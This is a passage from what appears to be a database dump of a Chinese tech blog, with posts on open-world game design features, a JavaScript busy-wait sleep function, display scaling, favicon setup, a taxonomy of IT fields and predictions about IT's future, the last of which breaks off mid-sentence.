Scrolls上古卷轴系列就做得很好：主人公与周边细小物品易碎品以及其他生物都有很好的互动，深刻诠释了“人可以改变环境”。宁外，武器装备的发达程度同样决定了对环境的驾驭能力:枪械弹药、装甲、登山服、降落伞、滑翔翼，等等。这些元素都是玩家在现实世界中无法轻易获取的，如果在虚拟世界中能满足这些欲望那必然能增加你的游戏的销量。\r\n\r\n\r\n\r\n####6.空间自由度\r\n\r\n人物移动的时候最不能容忍的就是空气墙：明明有路可走，偏偏地图上有一道阻隔墙。这一点上很多经典系列都得像Grand Theft Auto侠盗猎车手系列学学什么叫“逍遥世界任我行”。请记住，能走通的地方没有特殊情况都不要设置阻碍，让玩家“条条大路通罗马”才是正确的选择。\r\n\r\n\r\n\r\n####7.请遵循物理规律,谢谢\r\n\r\n同上一个“空气墙”，游戏中想要完成的一些动作倘若符合常理但却受到种种限制，会让玩家很受伤，感觉智商受到了侮辱。To fix it，还请游戏总监遵循力学、光学、电磁学等常见物理学定律，让玩家充分施展想象力，多途径地完成任务。不知是否玩过一款00后智力闯关游戏Ballance平衡球，它就是力学系统的经典代表，虽然元素相对单一但却正真实现了“没有想不到只有做不到”，完全遵循了牛顿力学定律，一丝不苟。关于该游戏详情请参见我的另一篇文章《致全球第一批全帧3D游戏!》。\r\n\r\n\r\n\r\n####8.交通工具要发达\r\n\r\n赛车游戏之所以是一个单独的游戏分类，主要因为在高速移动的时候给人一种“畅游”的快感。由此可知交通工具的重要性。Just Cause正当防卫系列中上百种汽车和飞机无疑是一大亮点。但是想做到极品中的极品，光靠现实世界的交通工具远远不够，任然需要开发者发挥想象力，开发出更潇洒更帅气更自由的运输工具，我们在游戏中已经邂逅过的“神奇”交通工具有：陆行鸟，剑齿虎，单人飞行器，两栖轮，磁悬浮机车，甚至还有时光机。\r\n\r\n\r\n\r\n####9.颜值\r\n\r\n嗯。。这个也是很强势的，除了颜值还有人物身材。人体审美一直都是人类基本的生理需求，虽然不一定要丰乳肥臀，肌肉缠身，但至少别整一个面瘫的屌丝充当男一号吧，要符合大众玩家的喜好，选择一个光鲜亮丽年轻有为的形象作为主角吧。不仅人物要好看，动物也要有魅力，那些网游里的坐骑和宠物如果有的话无不是霸气和呆萌的，嗯。。关于这一点应该不用再说了吧。当然了颜值这东西只是符合了大众的喜好，如果要制作一部小众人群的圈内游戏就要另当别论了。\r\n\r\n\r\n\r\n####10.自定义身材和脸谱\r\n\r\n在角色扮演游戏中（不过现在的大型单机基本都是RPG），玩家就是游戏主人公，会身临其境地感受人物在游戏世界里发生的一切，所以人物的形象就代表了玩家自己。毕竟不同的人对于脸蛋的偏好也不同，对颜值的理解也有差异，因此人物定制格外重要，这里要提名的代表是Dragon Ball Xenoverse龙珠超宇宙系列。值得一提的是，对于有选择困难的同学，游戏开始之前就要耗掉大量的时间在这里，还很痛苦，所以你在设计的时候最好提供一个机制，例如随机选定，或者是推荐类型，然后提示“日后可以随时更改”，这样就有助于玩家快速进入游戏世界。\r\n\r\n\r\n\r\n####11.随机生成自然环境\r\n\r\n绝大多数3D游戏中的地面植被都是算法随机生成的，不信你尝试每次切换进入草地或森林，会发现植物的位置会有差异。随机生成植被有两个好处：节约了存储成本；符合了新城代谢的自然规律。生存系列No Man\'s Sky无人深空完美地证明了随机算法的强大：不仅是植被，就连每个星球的地貌和气候都是随机的。\r\n\r\n\r\n\r\n####12.自定义环境\r\n\r\n人不仅可以改变环境还可以定义环境。不是游戏中每个景色都受到喜爱，有的地方甚至会招来反感。这时给玩家一个支点，他们能翘起整个游戏的高度！虽然最不到如沙盒系列Minecraft我的世界一样，但你既可以保留mod接口也可以亲自设计一个自定义系统，比如一座都市的建筑物布局系统，交通管道系统，车流量系统，又或者自然界中的地貌海拔定制，河流湖泊定制，气候规律定制。这都是我能想到的，至于实现，最好能引入高等数学的二元函数用来存储各种曲面以节省空间。\r\n\r\n\r\n\r\n####13.物品的收藏\r\n\r\n收藏的乐趣和成就感自古是一个游戏（尤其是网络游戏）至关重要的快乐要素，资本主义核心价值观就是对物的占有，自此邪风吹入大陆，身受其害的骚年们也在源源不断的收集中嘿嘿一笑23333。游戏中可收集的东西很多，例如武器、服装、食物、金钱、奖章、古董、宠物、技能等等一切还未想到的元素，甚至等级和经验值的累积都体现了“资本”的哲学。你们所要做的就是将这些可收集的“实物”做得更精美，最好3D化，给玩家一种实在感。\r\n\r\n\r\n\r\n####14.队友间的合作与救助\r\n\r\n有一种激动叫“你不是一个人在战斗”。热血战斗尤其是boss战，如果身边有一位或几位面对共同敌人的同伴与自己协同战斗，不仅能大大降低难度，更让玩家感到不孤单。对此，很多游戏都加入了两个重要元素：队友合作技和救死扶伤技。加入这些要素，你的游戏体验会更美好！\r\n\r\n\r\n\r\n####15.人物的AI\r\n\r\n上面说到了队友，就要谈谈队友的智商，以及所有NPC的AI指数。如果和你一起旅行的队友给你的感觉是一个人造人的存在，那么游戏剧情也优秀不到哪去。一个虚拟角色，从他的表情，性格到言辞，配音以及肢体语言都需要精心设计的同时丰富多彩不重复，才能让他变成主角的一个有血有肉的朋友，最好还要增强与主角互动的主动性，让玩家感到被关爱！\r\n\r\n\r\n\r\n####16.多人联机\r\n\r\n这个没话说，我们不但需要虚拟的同伴，还需要真实的战友或对手。多人模式是很多大型游戏必备的服务，不仅本地提供多输入还要支持网络共享。\r\n\r\n\r\n\r\n####17.操纵多人\r\n\r\n策略游戏诸如War/StarCraft魔兽系列，将每个人物视作一个单元，实现从上帝视角操纵整体进行战争，与传统RPG体验有着本质不同。\r\n\r\n\r\n\r\n####18.功能强大的自制手柄\r\n\r\n对，你没听错，独家手柄，我想这应该是所有成功要素中最难实现的了：不仅技术上很困难，市场上也恐难推广。目前还没听说哪家游戏公司开售自制游戏手柄,少有人会为了玩某一款游戏去买一个手柄（虽然作者我曾为了玩Far Cry远哭系列而买了一台PS4。。）。而我一直梦想有一个全方位多功能的游戏控制器，不仅仅是手柄，而是响应身体的各个活动：手指、四肢、头部等等。控制器的丰富输入不仅体现在按键的数量，还要量化按键（或者摇杆）的力度和方向，以实现玩家对游戏的最大化控制。\r\n\r\n\r\n\r\n####19.升级至A/VR\r\n\r\n与自制手柄不同，虚拟现实设备将是下一代电子游戏全新的输入输出设备，但有点像上一条“自制手柄”的升级版，不同的是它会形成一个标准商品就像目前的PlayStation和Xbox游戏机一样，所以有意向的朋友们赶紧投资相关行业吧。\r\n\r\n\r\n\r\n####20.绝对自由的战斗系统\r\n\r\n这一点还没有那个厂商能骄傲的宣称能做到，所有的战斗动作（无论普攻，防御还是技能）都是固定模式的动画过程，无法中途切换，这使得战斗多变成了“乱砍狂杀”，除了偶尔切换姿势嗑点药，几乎毫不考验手感。我们需要的是能更遵循物理规律的，空间上多方向的攻防战术以及拳拳到肉的快感。想达到这个目标不仅要复杂的算法还需要多输入的“自制手柄”，相信15年内能在地球某个角落看到这成功景象。\r\n\r\n\r\n\r\n####21.自由的音乐系统\r\n\r\n一曲背景音乐并不是每个人也不是每时每刻都喜欢，如果你被困在一个地下迷宫若干小时单曲循环着一首阴森凄凉的交响乐，是个人都会抑郁的好吧（本人受害者不谈）。你得时刻为玩家着想，定时切换，避免审美疲劳，甚至可以利用大数据（来自BAT网易新浪等互联网公司）以实现对玩家的偏好锁定，也可以允许本地上传或在线下载曲目（自建大数据）。自由的音乐系统无疑是你的游戏脱颖而出的一大亮点。\r\n\r\n\r\n\r\n####22.必要的帮助信息\r\n\r\n不得不说，现在的沙盒游戏少了很多挑战，相反增加了许多娱乐，也许解释了为何美其名曰“视频游戏”。不过也没啥好惭愧的，忙碌的现代人玩游戏就是为了减压，所以不是说要一味地降低游戏难度，而是在玩家束手无策的时候提供必要的提示或辅助，代价是少量的奖励剥削，这样一来帮助玩家顺利通关任务，二来激发了玩家独自挑战的欲望。\r\n\r\n\r\n\r\n####23.挑战智商的元素\r\n\r\n和上一点相反，沙盒游戏仍然需要一些智力解谜类的挑战项目以迎合部分人的需求。每个高自由度的游戏无论什么类型都可以插入这类高难度内容，通常是附夹在支线剧情中从而不影响主线的顺利进行。当然也可以放在主线剧情中，代表作Tomb Raider古墓丽影系列。\r\n\r\n\r\n\r\n####24.挑战手感的元素\r\n\r\n好的游戏手感是建立在丰富的游戏经验基础上，衡量了老玩家对游戏的钟爱程度。手感元素和智商元素一起决定了一款趣味游戏的趣味程度，区别于冒险类的打怪升级“不需要太多的游戏技巧”。\r\n\r\n\r\n\r\n####25.故意遗留的bug\r\n\r\n有时候游戏的设计漏洞会成为爱好者们津津乐道的地方，在不影响体验的情况下玩家们会尽情利用这些漏洞来完成一些不可思议的探索，这种方法圈内称为卡bug，增加了更多的游戏时长和乐趣。除了漏洞，你还可故意留一些设计上的“不合理”，比如随机抽奖：读档-存档大法无限刷钱，满足了玩家“不劳而获”的快感。当然这些只能存在于单机游戏中。\r\n\r\n\r\n\r\n####26.源源不断的dlc\r\n\r\n当一部游戏被玩到了尾声，非游戏粉终于松了口气，但正真的忠实玩家会有一种失落感：一切都结束了。很多玩家看到这里都有共鸣，当自己寄托深情的一段剧情走到终点难免有种淡淡忧桑，便开始怀念起之前走过的路。有些玩家选择重玩第二遍，第三遍，但快到结局的时候总是不自觉的放慢脚步，留恋四周，甚至停滞不前，就像我曾经为国产单机PALadin仙剑奇侠传系列裸献节操一样：停住不玩，保留一种“故事未结束”的幻想。So，What Would You Do？你要不断的更新单机游戏DLC，提供可下载的新剧情和新地图，切记不要老整一些没用的新道具也不要像网络游戏一样内容空洞，从此告知粉丝“我们的故事仍在继续，同志仍需努力”。\r\n\r\n\r\n\r\n####27.技能系统多元化\r\n\r\n对更强大的技能（包括战斗技能，生存技能等）的追求也可以属于“收藏成就感”的范畴，但要单独说，因为主人公技能的数量和质量决定了他在这个虚拟世界“逍遥游”的能力。\r\n\r\n\r\n\r\n####28.完善主流价值观\r\n\r\n主角团队的核心价值体系一直是整个剧情的推动剂。勇气、友谊、智慧、爱心、单纯、光明、恒心、真诚、希望、正义、梦想，这些出现在动漫世界中的珍贵品质同样适用于RPG游戏。\r\n\r\n\r\n\r\n####29.多一些情感元素\r\n\r\n一定要尽可能囊括所有的情感元素，包括人与人之间（亲情，爱情，友情），人与自然（对动植物的喜爱，对海陆空的向往）等等，尽可能让观众产生共鸣。顺便透露个小秘密：现代的剧情设计团队们越来越喜欢利用“同情”来拉近我们与虚拟人物的距离，你也可以试试！\r\n\r\n\r\n\r\n####30.科/魔幻世界观\r\n\r\n很多神话主题视频游戏之所以吸引人就是因为它们独特的世界观，它们往往刻画了现实中不存在的事物，比如神兽和魔界。即使是正常的人类世界观，很多游戏也喜欢故意夸大化一些细节，比如巨大的月亮，密集闪烁的星空，变化多端的极光和流星，还有高科技。\r\n\r\n\r\n\r\n####31.完全无缝\r\n\r\n个人觉得很鸡肋，有些人却喜欢追求极致：无缝进入房间；无缝转入战斗；无缝切入对话。作为游戏开发者的你也可以考虑下该要素。选择好游戏认准这30个特质\r\n\r\n',5767),(58,'非常实用的ES6下的模拟sleep函数','2018-02-06 18:01:43',0,0,2,'由于JavaScript的单线程特征,很多函数标准库中没有提供,于是我们只能超越标准库啦,实现一个sleep()函数就是其一:\r\n```\r\nfunction sleep(d){\r\n  for(var t = Date.now();Date.now() - t <= d;);\r\n}\r\n \r\nsleep(5000); //当前方法暂停5秒\r\n```\r\n当然了这个方法不适合长期使用',189),(59,'分辨率与系统缩放关系问题','2018-02-06 18:10:10',3,1,8,'###holyshit\r\n![U_O8NIF0_W3RDZMD4_UB3X](https://yqfile.alicdn.com/168c762f7fa55bddc2c662dc0fdf470647c5c61e.png)\r\n神圣的狗屎啊,就是这玩意,之前调成了125%:\r\n![0_ZUX6KWCE04K_JXG0928SO](https://yqfile.alicdn.com/887cb2c34b83a19778c2ac20e4b19e0c40a0820e.png)\r\n然后悲剧....\r\n为啥windows推荐125%倍放大???以为我们都是残障人士么..\r\n其实这个和浏览器放大一个道理:\r\n>ctrl+滚轮等同于窗口缩放\r\n>系统缩放等同于给整个屏幕\"物理拉缩\"\r\n\r\n##因为系统的权限一定是高于无论是浏览器还是java\r\n所以应用程序得到的一切权限和数据都是系统给他的,也不知道真的假的.\r\n-------\r\n------\r\nhere come the question:\r\n\r\n像素问题/????\r\n一个小窍门:\r\neg:\"\"\r\n```\r\n>如果是浏览器内容放大就相当于窗口缩小:像素(尺寸)减少,\r\n在自适应页>面中就会检测到更少的width\r\n\r\n\r\n>如果是系统桌面,全部内容放大就相当于...系统分辨率的牺牲!!!!\r\n然后导致java检测鼠标的坐标时得到windows的反馈值就是一个虚拟的屏幕坐标而不是真正的物理坐标\r\n\r\n```\r\n##移动端浏览器\r\n用chrome调试过前端的都知道,chrome可以模拟手机,比如下图模拟了iphone7plus:\r\n![3_1_SS_I_M_W_ROG_N](https://yqfile.alicdn.com/27000479842a364fdb43df236b8f4a840d9e075d.png)\r\n但是如果你把浏览器窗口强行缩小成手机的尺寸,会发现得到两个完全不一样的显示效果,很明显手机端看得更吃力一点.\r\n这就是手机端浏览器给你强行等比例缩小了,它和浏览器内核或者dom解析都无关,效果等同于眼睛原理电脑屏幕一米.\r\n#总结\r\n缩放功能很坑爹,它是独立的一层渲染,凌驾于任何底层解析之上,也是前端人员头痛的地方之一.',948),(60,'favicon.ico是什么?','2018-02-07 14:18:01',1,0,14,'>转自百度百科...\r\n\r\n所谓favicon，即Favorites Icon的缩写，顾名思义，便是其可以让浏览器的收藏夹中除显示相应的标题外，还以图标的方式区别不同的网站。当然，这不是Favicon的全部，根据浏览器的不同，Favicon显示也有所区别：在大多数主流浏览器如FireFox和Internet Explorer (5.5及以上版本)中，favicon不仅在收藏夹中显示，还会同时出现在地址栏上，这时用户可以拖曳favicon到桌面以建立到网站的快捷方式；除此之外，标签式浏览器甚至还有不少扩展的功能，如FireFox甚至支持动画格式的favicon等。\r\n\r\n- 中文名 网站头像 \r\n- 外文名 Favorites Icon \r\n- 英文简写 favicon\r\n####如何调用\r\n浏览器调用favicon的原理是首先在网页所在目录寻找favicon.ico文件，如果没有找到就去网站的根目录寻找。所以最简单的方法就是将制作好的favicon文件命名为favicon.ico然后上传到网站的根目录下。\r\n如果您需要将Favicon.ico放到其他目录下，或者希望让不同的网页显示不同的Favicon，就需要在网页Html文件中做设定了，具体设置也很简单，在Html中的< head>部分加入如下的代码：\r\n< link rel=”icon” href=”/dir/favicon.ico” mce_href=”/dir/favicon.ico” type=”image/x-icon”>\r\n< link rel=”shortcut icon” href=”/dir/favicon.ico” mce_href=”/dir/favicon.ico” type=”image/x-icon”>\r\n< link rel=\"icon\" href=\"animated_favicon1.gif\" type=\"image/gif\" >\r\n含义：在浏览器标签中显示favicon，在收藏夹中显示favicon。\r\n',859),(61,'如何细分我们的IT行业?','2018-02-08 18:19:01',3,0,6,'>去年6月份在策划这个博客分类的时候想到的参考依据,哗啦哗啦就把想到的写下来了\r\n\r\n####IT界(Info Tech)可以划分为13个领域\r\n\r\nLocation:	NanJing ????\r\n\r\nDate:	Wed 7 Jun\r\n\r\nTime:	9:37 AM\r\n\r\n概述:\r\n\r\n    IT领域是一个硕大无比的领域,该领域之大超越了人类社会几乎其他所有领域比如政法坛 娱乐圈 医学界 等等.虽然从事IT的人数不是最多的,但其知识技术体系却庞大得令人窒息,所以对IT领域进行划分(这里囊括了一切与IT相关的技术领域)也有许许多多的标准,比如最常见的IOS七层模型,或者在外行人眼里的三座大山(计算机 软件 互联网).但笔者认为这些划分都是不完美 不完整的,至少他们也得把IOT和AR加进去啊.纳闷今天我就依照自己的眼光,带大家重新认识一下IT.这里既是从物理层面也是从逻辑层面划分,是多种综合分类分层方法的结合,将IT领域划分为了13个大块,每块还继续向下划分为若干个子领域,那么下面就开始吧(排名不分先后)!\r\n\r\n\r\n\r\n###I.应用软件与互联网服务/APP&Internet Service\r\n应用软件\r\n1.终端程序:终端程序指的是在本地运行的程序,无需与服务器交互,比如office软件 Adobe产品 等等,这些都是生活必需品.\r\n\r\n2.脚本:脚本程序,和app不同的是(通常)没有完整的gui和体系,主要是为了实现一些辅助功能,专业人士的最爱.\r\n\r\n3.客户端:与前两者对应,客户端软件就是需要联网的平台,比如常见的网络游戏.\r\n\r\n互联网服务\r\n1.社交账号:不用多说,脸书和推特以及中国的WeChat,以及其余一大堆社交账号.个人账号服务是企业与用户建立稳定联系的重要手段,小编我就有不下20个社交账号.\r\n\r\n2.云盘服务:网盘 云端存储服务也是非常非常非常重要的IT服务.百度网盘是国内最普及的云盘.但我最期待的还是网盘的同步机制,有了它能带给我们这些IT??满满的幸福.\r\n\r\n3.媒体网站:新闻媒体服务,国内的新浪和网易,国外的雅虎.还包括视频网站,不用多说了.\r\n\r\n\r\n\r\n###II.服务器与数据库系统/server&DBMS\r\n服务器\r\n1.linux:Linux数最流行的服务器操作系统,因其稳定性而大受欢迎,关于Linux的详细内容将在’操作系统’部分呈现.\r\n\r\n2.脚本/script:中间件,通常连接客户机和数据库的中间程序,与’客户端脚本’有本质区别.\r\n\r\n数据库系统\r\n1.sql:数据库管理系统最常用的就是sql语句了,其上有MySQL sqlserver等管理软件,都是在服务器端运行的,如果放在web领域,数据库是在后端工作的.\r\n\r\n\r\n\r\n###III.网页语言与浏览器/Web&browser\r\nWeb语言\r\n‘’’web领域是最热门的领域之一,小编也是从业者,目前微信小程序更是一大创举’’’\r\n\r\n   1.html5:标记语言,并不是程序语言,其实它已经没有版本号的概念了,因为以后都只叫html就行了,它是向下兼容的,意味着多古老的网页都可以被最新的浏览器渲染出来.\r\n\r\n   2,css:前端美工语言,美化页面,基本没什么实用性,当然也可以注入.\r\n\r\n   3.JS:动态页面脚本,非常有用.通常网页小游戏就是通过JavaScript做出来的,多多学习他!!\r\n\r\n浏览器\r\n1.内核:浏览器的存在是一个必然.从某种意义上来说.浏览器是客户端程序&客户端协议统一化的产物.\r\n\r\n2.console:几乎所有浏览器都有console接口来给程序员调试使用.chrome firefox Safari的console接口都是很完美的.\r\n\r\n3.headless browser(CLI):这时下一代’虚无’浏览器.它没有图形化界面,只有一个冷冰冰的命令行接口以及一个第三方驱动.无gui意味着后台运行,同时也意味着’高效’\r\n\r\n4.webdriver:同上,webdriver就是大多数浏览器(包括手机端)的外部接口,供比如说Python Java来操纵,以完成自动化测试,满满的幸福啊??\r\n\r\nC. 搜索引擎\r\n\r\n1.SEO:关于搜索引擎就不多说哦了,但是SEO(网站优化)是一个热门行业,想让你的网站进入搜索引擎的前端排名只有提升质量,当然也可以竞价:),总之只要别让你的网站被引擎抛弃,成为dark web(搜索不到的网站),都是有救的.\r\n\r\n\r\n\r\n###IV.黑客与信息安全/hacker&security\r\n黑客技术类型\r\n   1.渗透测试:在字符串的转接中,最常用的手段就是渗透攻击,无论在B/S还是C/S模式下.\r\n\r\n   2.自动化:自动化攻击如DDoS攻击通过自动化程序发动大量攻击,缺点是稳定性差.\r\n\r\n3.欺骗技术:欺骗手段常常是黑客与用户的博弈.\r\n\r\n安全\r\n1.防火墙:Firewall工作在靠近底层,所以对于一些应用上层的攻击毫无还手之力.\r\n\r\n2.加密:加密技术应该是比较成熟的防御技术了.分为对称加密和不对称加密,如RSA,至少在目前,黑客们都不会打攻击密码的注意.\r\n\r\n3.断网:O(∩_∩)O哈！懂得.这个手段最安全100%防御网络攻击,秒杀防火墙和加密技术.\r\n\r\n\r\n\r\n###V.底层编程与算法/programing&algorithm\r\n程序语言\r\n1.java\r\n\r\n2.c/c++\r\n\r\n3.Python\r\n\r\n4.C#\r\n\r\n5.JS\r\n\r\n算法\r\n1.数据结构:我们常见的数组,栈,队列,链表,各种树,地图,都是数据结构.\r\n\r\n2.对象与方法:几乎所有程序语言里都有对象与方法,甚至说,一切都是对象/一切都是方法.\r\n\r\nC.数据类型\r\n\r\n1.数:数字/digit,是人对二进制数据最原始的认识\r\n\r\n2.串:字符串/string,是在二进制数字的基础上进行编码而得到的能被人类识别的数据.\r\n\r\n  3,组:数组/列表/list,是数和串的组合系列,当然也可以嵌套\r\n\r\n4.典:字典/JSON,键值对应序列,字典是当下最时尚的数组类型,在很多领域(包括浏览器缓存)都有字典的影子.\r\n\r\n5.文件:存储在外存中的数据,可以有各种文件格式,没得解释.\r\n\r\n\r\n\r\n###VI.网络技术与协议/network&protocol\r\n网络技术\r\n    1.VPN:哈哈,翻墙必备服务,其实是打着vpn的幌子来翻墙,在墙外找一个点(服务器或者是你的海外朋友),然后你们之间加密传输数据就行啦!\r\n\r\n2,tcp/ip:这是网络路由技术的核心,tcp/ip旗下有无数的自协议,纷繁复杂,共同定义了互联网!!\r\n\r\n底层协议\r\n1.路由协议:常用的路由协议有EIGRP OSPF IS-IS BGP等等,他们各具特色,各不相同,是子网的核心协议.这个领域的专业认证是思科公司的CCIE系列.\r\n\r\n2.二层协议:位于OSI协议栈的第二层数据链路层主要是为了解决连通性,提供稳定的联通\r\n\r\n\r\n\r\n###VII.多媒体与编码/multimedia&coding\r\n多媒体:这个不用介绍了吧,什么字符啦,矢量图啦,相片啦,音频视频啦都属于媒体,在未来还会出现更丰富更复杂的媒体,满足人类的五大感官..\r\n编码:这里指的是字符编码,字符编码是介于二进制数字和字符之间的转换算法,帮助人操纵二进制数据.\r\n表示层:表示层位于OSI分层结构的第六层，它的主要作用之一是为异种机通信提供一种公共语言，以便能进行互操作。这种类型的服务之所以需要，是因为不同的计算机体系结构使用的数据表示法不同。说了这么多,他就是两个字:编码.\r\n\r\n\r\n###VIII.物理层与硬件/physical layer&hardware\r\nOSI底层:OSI参考模型第一层就是物理层了,但这一层只是定义了与通信有关的一些标准,所以主体还是网络.\r\n计算机硬件\r\n计算机硬件应该是离程序员最远的领域了(也是小编最不喜欢的领域),不过硬件是底层,基层做的不好程序再完美也不好使,所以我们对计算机硬件还是要有一个充分了解的:)\r\n\r\n1.cpu:中央处理器\r\n\r\n2.gpu:显卡\r\n\r\n3.memory:内存\r\n\r\n4.hard disk:硬盘/外存\r\n\r\n  5.motherboard:主板\r\n\r\n6.battery:电池\r\n\r\n7.power adapter:电源适配器/变压器\r\n\r\n8.sound card:声卡\r\n\r\n9.input device:输入设备\r\n\r\n10.output device:输出设备\r\n\r\n通信原理\r\n1.电:电缆/双绞线:传输电子信号\r\n\r\n2.光:光纤:传输光信号\r\n\r\n3,磁:电磁波:空气传输\r\n\r\n以上三种传输物质都是物理学家眼中的”上帝物质”,因为真空速度都是3亿米/s,都由频率定义.IT人把它们拿来传输数据真是再cool不过了!\r\n\r\n\r\n\r\n###IX.操作系统与接口/OS&interface\r\n操作系统的存在是一个必然.OS是软件但是最底层的软件.试想,如果没有操作系统,所有的应用软件都得从底层,从裸机的机器语言开始写起,得多费劲,同时还浪费了大量的存储资源.因此操作系统也是IT界最困难的技术之一,被称作为IT树上的第三座大山.\r\n\r\nAPI:API 接口属于一种操作系统或程序接口，GUI接口属于一种图形操作系统。两者都属于直接用户接口。有时公司会将 API 作为其公共开放系统。\r\n输入法:除了本地输入法应用程序文字的输入功能外，随着互联网的发展，不少互联网公司也推出了基于云平台的在线输入法，可以在浏览器上直接调用输入法进行汉字的输入。\r\n文件系统:文件系统是软件系统的一部分，它的存在使得应用可以方便的使用抽象命名的数据对象和大小可变的空间。\r\n输入输出设备:说道I/O，就不得不说起即插即用。随着新技术的发展，人们已经厌倦使用驱动光盘来安装新设备的驱动。而即插即用的新技术的来临，则解决了这个问题。\r\nE.分类\r\n\r\n1.Windows:\r\n\r\n2.mac/OSX:\r\n\r\n3.Linux:\r\n\r\n4.Android\r\n\r\n5.IOS\r\n\r\n\r\n\r\n###X.虚拟化与逻辑层/virtualization&logic\r\n虚拟机:想必不会陌生.VM并不是新技术.将虚拟机技术应用到杀毒方面，却是一个杀毒业界一直在追求和探索的课题。由于大部分的病毒及木马都会加密加壳，所以在未激活的状态下杀毒软件是无法进行扫描的。而 “虚拟机杀毒技术”即是在电脑中创造一个虚拟CPU环境，将病毒在虚拟环境中激活，根据其行为特征，从而判断是否是病毒。所谓虚拟机技术，就是用软件先虚拟一套运行环境，让病毒先在该虚拟环境下运行，从而观察病毒的执行过程。\r\n模拟器:计算机模拟是利用计算机进行模拟的方法。利用计算机软件开发出的模拟器，可以进行故障树分析等复杂的模拟任务。在优化领域，物理过程的模拟经常与演化计算一同用于优化控制策略。\r\nVR/AR:虚拟现实/增强现实.AR技术在人工智能、CAD、图形仿真、虚拟通讯、遥感、娱乐、模拟训练等许多领域带来了革命性的变化。\r\n\r\n\r\n###XI.游戏与三维技术/games&3d\r\n游戏引擎:把目光锁定到当今的热门大作上,游戏可以说是最复杂的软件,没有之一.因为游戏需要独特的底层,同时不同游戏之间的很少有相似之处,因此游戏操作系统非常难做.虽然PS4等公共游戏平台被很多厂商青睐,但是它也只是定义了输入设备和少得可怜的API,Windows就更不用说了.\r\n游戏分类:Um....太多了??不说了\r\n操作系统/设备:游戏(这里指大型单机游戏)通常需要独特的操作系统和输入设备,因为不同于办公和影音娱乐.比如游戏手柄是一种常见电子游戏机的部件，通过操纵其按钮等，实现对游戏虚拟角色的控制。\r\n\r\n\r\n###XII.智能与深度学习/smart&AI\r\n深度学习:深度学习的概念源于人工神经网络的研究,后来借其自动化的算法引入了计算机领域.深度学习是机器学习研究中的一个新的领域，其动机在于建立、模拟人脑进行分析学习的神经网络，它模仿人脑的机制来解释数据，例如图像，声音和文本。\r\n大数据:大数据经常用于分析用户.大数据分析的产生旨在于IT管理，企业可以将实时数据流分析和历史相关数据相结合，然后大数据分析并发现它们所需的模型。反过来，帮助预测和预防未来运行中断和性能问题。进一步来讲，他们可以利用大数据了解使用模型以及地理趋势，进而加深大数据对重要用户的洞察力。 他们也可以追踪和记录网络行为，大数据轻松地识别业务影响；\r\n分布式&云计算:同大数据,云技术要求大量用户参与，也不可避免的出现了隐私问题。很多用户担心自己的隐私会被云技术收集。正因如此，在加入云计划时很多厂商都承诺尽量避免收集到用户隐私，即使收集到也不会泄露或使用。\r\n\r\n\r\n###XIII.物联网与人造卫星/IOT&GIS\r\nIPv6:虽然IPv6在全球范围内还仅仅处于研究阶段，许多技术问题还有待于进一步解决，并且支持IPv6的设备电非常有限。但总体来说，全球IPv6技术的发展不断进行着，并且随着IPv4消耗殆尽，许多国家已经意识到了IPv6技术所带来的优势.随着IPv6的各项技术日趋完美。IPv6成本过高、发展缓慢、支持度不够等问题将很快淡出人们的视野。\r\n物联网:物联网是在计算机互联网的基础上，构造一个覆盖世界上万事万物的“Internet of Things”。在这个网络中，物品(商品)能够彼此进行“交流”，而无需人的干预。其实质是利用射频自动识别技术，通过计算机互联网实现物品(商品)的自动识别和信息的互联与共享。\r\nGIS:地理信息系统GIS专业学生主要学习地理信息系统和地图学、遥感技术方面的基本理论和基本知识，要受到应用基础研究和技术开发方面的科学思维和科学实验训练.\r\n卫星网:顾名思义,三维互联网.在未来所有网络都会统一到互联网,谷歌甚至构划了一个星际网络,以顾未来的星际游民.\r\n\r\n\r\n',5798),(62,'关于行业前沿的一些发展趋势...','2018-02-09 12:25:57',1,0,5,'>搬家于2018-02-09\r\n\r\n####IT行业的8大恐怖预言\r\n---\r\n\r\n\r\n\r\n\r\n        第三次科技革命已经进入白热化阶段———信息技术革命作为其中最主要的一环已经奠定了其基本格局和趋势。OK大势已定，根据目前的形势，小编和我的小伙伴们专门探讨了一个作为预言家的主题——IT的未来，并总结了x个未来很有可能发生的大变革以完成这一期的专题。\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n###第①大\r\n\r\n####高维的统治地位\r\n\r\n诞生新的媒体格式—3D实体\r\n\r\n目前已有的所有媒体文件类型分别为：文本、图片、音频和视频。这些编码形式貌似已经稳定了，但是随着3D技术的不断发展，在未来极有可能甚至必然会出现一个新的文件——3D图像文件。3D图像文件是平面图像文件的进化版，但是会与其并存而不是取代。其实3D图像并不难实现，比如我么首先想到的就是用若干层支持透明2D图片堆叠而成一个3D实体，再用目前主流的视角旋转成像原理形成3D图像，但这有一个缺点就是需要很大的存储体积，于是我们又想到，任然以平面像素为基础，每个像素只记录可见部分的颜色，这样就完美解决了刚才的问题。\r\n\r\n\r\n\r\n3D矢量图\r\n\r\n模仿svg矢量图，3D矢量图同样可行，而且大大降低了存储成本，能用数学公式表达的曲面都可以在三维坐标下呈现。挖一个梗：3D拍摄技术恐成为最大难题，目前无任何理论支撑。想到又一次和我大伯讨论游戏，他居然认为3D游戏是剧组拍出来的，我会心一笑~\r\n\r\n\r\n\r\n三维动画\r\n\r\n有静态成像就有动态，和flash原理一样，依据矢量路径，完成一系列3D变换，这也就是视频游戏的实现方法（加载脚本）。\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n###第②大\r\n\r\n####软件的独立日\r\n\r\n软件定义everything\r\n\r\n从最早的SDN软件定义网络到现在的SDW软件定义世界，行内人早就深有体会：软件正在取代一切。从客户端到服务器，每一项任务几乎都是软件编织的。此外，编程语言的数量会急剧减少或者统一绝大部分：要知道机器语言的数量在巅峰时期甚至超过了人类社会有文字语言的数目，但很快，大部分都会被统一标准淘汰。\r\n\r\n\r\n\r\nWeb的衰落\r\n\r\n虽然很不愿意承认，但是的确有这个可能，因为小编我就是主打web工作者。web上最主要的标记语言html恐要被程序语言覆盖，毕竟H5的表现形式有限，在未来很难满足用户的更高需求。\r\n\r\n\r\n\r\n操作系统的溃散\r\n\r\n操作系统要倒霉了！我们都知道，应用软件几乎都是建立在操作系统之上的，虽然可以随意使用现成的API但是却处处受限（这里指的是被系统封杀了很多权限）。但换个思路想想，操作系统也是软件，软件干嘛不从0开始制作呢？底层原理，框架内核，层层盖楼，虽然增大了体积，却独立于任何底层，满满的实在感，宛若游离的灵魂找到了自己的身体。这条预言的依据就是，现在越来越提倡自由的操作系统（GNU），linux的出现满足了人们自由的理念，但linux虽然可以自由更